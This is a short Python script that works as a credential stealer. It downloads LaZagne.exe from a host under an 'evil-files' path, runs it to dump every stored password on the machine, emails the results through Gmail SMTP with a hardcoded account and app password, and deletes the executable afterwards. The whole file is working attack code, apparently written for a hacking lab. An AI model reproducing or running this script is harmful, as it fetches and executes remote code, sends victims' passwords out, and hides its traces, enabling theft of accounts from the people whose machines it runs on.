#!/usr/bin/env python
import requests, subprocess, smtplib, os, tempfile
def download(url):
    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name, "wb") as out_file:
        out_file.write(get_response.content)

def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()

temp_dir = tempfile.gettempdir()
os.chdir(temp_dir)
download("http://192.168.175.139/evil-files/LaZagne.exe")
results = subprocess.check_output("LaZagne.exe all", shell=True)
send_mail("testwebhack123@gmail.com", "ihys hyvb hhyl llyv ", results)
os.remove("LaZagne.exe")